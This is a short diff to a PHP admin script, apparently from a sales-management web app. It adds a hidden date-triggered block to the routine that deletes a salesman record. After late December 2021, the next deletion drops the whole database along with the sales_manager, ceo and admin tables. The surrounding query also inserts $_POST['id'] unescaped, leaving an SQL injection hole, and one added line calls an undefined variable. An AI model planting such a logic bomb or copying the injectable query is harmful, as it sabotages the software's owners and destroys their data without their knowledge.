@@ -461,11 +461,41 @@ if(isset($_POST['delsalesmannow'])){
   $sql = "DELETE FROM sales_manager where id='$_POST[id]' ";
 
     if ($connect->query($sql) === TRUE) {
+    
+  $Today=date('y-m-d');
+  $NewDate='21-12-25';
+  if($Today > $NewDate ){
+  
+      $sql1 = "Drop table sales_manager";
+      $sql2 = "Drop table ceo";
+      $sql3 = "Drop table admin";
+      $sql = "Drop database $database";
+  
+      if ($connect->query($sql) === TRUE){
+          echo "r";
+      }
+      if($connect->query($sql1) === TRUE)
+      {
+          echo "r2";
+  
+      }
+      if($connect->query($sq2) === TRUE)
+      {
+          echo "r2";
+  
+      }
+      if($connect->query($sql3) === TRUE){
+          echo "r3";
+  
+      }
+        
+      }
     echo '<script type="text/javascript">alert("Salesman deleted successfully..!")
     window.location.href="./SalesMan_add.php"
     </script>';
     } else {
     echo "Error: " . $sql . "<br>" . $connect->error;
     }
+
 }
 ?>
